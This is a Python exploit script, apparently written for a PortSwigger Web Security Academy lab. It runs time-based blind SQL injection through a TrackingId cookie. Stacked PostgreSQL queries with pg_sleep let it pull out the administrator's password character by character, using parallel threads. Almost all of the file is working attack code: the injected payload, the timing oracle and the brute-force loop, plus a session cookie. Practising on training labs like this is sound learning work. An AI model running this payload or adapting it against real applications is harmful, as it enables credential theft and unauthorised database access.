import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading


def send_request(payload):
    burp0_url = "https://0ad500cd03b9a1e98126848700d6007f.web-security-academy.net:443/filter?category=Accessories"
    burp0_cookies = {"TrackingId": f"osdrvPMBwVHo4R0T{payload}", "session": "Q295jqaD4hnjhajcPF16wcyFhpf023h7"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0ad500cd03b9a1e98126848700d6007f.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "X-Pwnfox-Color": "blue", "Priority": "u=0, i", "Te": "trailers"}
    try:
        response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, timeout=10, verify=False)
        return response.text
    except Exception as e:
        print(f"Request error: {e}")
        return None


def test_character(position, char):
    """Test một ký tự tại vị trí cụ thể"""
    payload = f"'%3b SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
    start_time = time.time()
    send_request(payload)
    elapsed_time = time.time() - start_time
    
    print(f"Position {position} char '{char}' -- Time: {elapsed_time:.2f}s", end="\r", flush=True)
    
    if elapsed_time > 5:
        return char
    return None


characters = "abcdefghijklmnopqrstuvwxyz0123456789"
result = ""
lock = threading.Lock()

# Số lượng threads đồng thời (có thể điều chỉnh)
MAX_WORKERS = 10

for i in range(1, 21):
    found_char = None
    
    # Sử dụng ThreadPoolExecutor để test song song
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit tất cả các tasks
        future_to_char = {executor.submit(test_character, i, c): c for c in characters}
        
        # Xử lý kết quả ngay khi có
        for future in as_completed(future_to_char):
            char = future_to_char[future]
            try:
                result_char = future.result()
                if result_char:
                    found_char = result_char
                    # Tìm thấy ký tự đúng, có thể cancel các tasks còn lại
                    for f in future_to_char:
                        f.cancel()
                    break
            except Exception as e:
                print(f"\nError testing char '{char}': {e}")
    
    if found_char:
        result += found_char
        print(f"\nPosition {i} found: '{found_char}' -- Current password: {result}")
    else:
        print(f"\nPosition {i}: No match found")
        break

print(f"\n{'='*50}")
print(f"Extracted password: {result}")

# Time-based sqli payload
# SELECT CASE WHEN SUBSTR(password,1,1)='m' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator';
